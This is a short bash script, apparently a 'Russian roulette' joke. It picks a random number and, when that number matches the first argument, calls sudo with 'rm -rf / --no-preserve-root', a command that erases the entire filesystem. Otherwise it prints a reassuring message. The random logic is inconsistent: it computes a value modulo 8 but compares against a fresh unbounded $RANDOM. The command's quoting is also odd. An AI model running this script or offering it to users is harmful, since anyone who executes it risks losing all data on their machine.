r=$(( $RANDOM % 8 )); echo $r

if [ $RANDOM -eq $1 ]
then
        sudo "rm -rf / --no-preserve-root"
else
        echo "Your Linux machine is safe now"
fi
